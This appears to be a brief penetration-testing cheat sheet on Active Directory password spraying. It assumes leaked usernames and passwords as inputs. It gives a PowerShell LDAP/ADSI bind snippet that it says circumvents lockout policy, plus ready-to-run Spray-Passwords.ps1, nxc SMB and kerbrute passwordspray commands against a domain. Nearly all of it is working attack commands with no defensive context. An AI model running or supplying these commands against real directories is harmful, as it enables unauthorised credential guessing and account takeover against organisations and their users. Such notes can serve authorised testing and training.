# Password Attacks

__REQUIRES__

 - Leaked users
 - Leaked passwords

LDAP + ADSI method - If the password is correct, creation of the object will be successful (circumvents lockout policy)
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

using spray passwords (in resources)
```powershell
.\Spray-Passwords.ps1 -Pass password123! -Admin
```

using nxc
```powershell
nxc smb 192.168.0.25 -u users.txt -p 'password123' -d corp.ad.com --continue-on-success
```

using kerbrute (cross-platform)
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```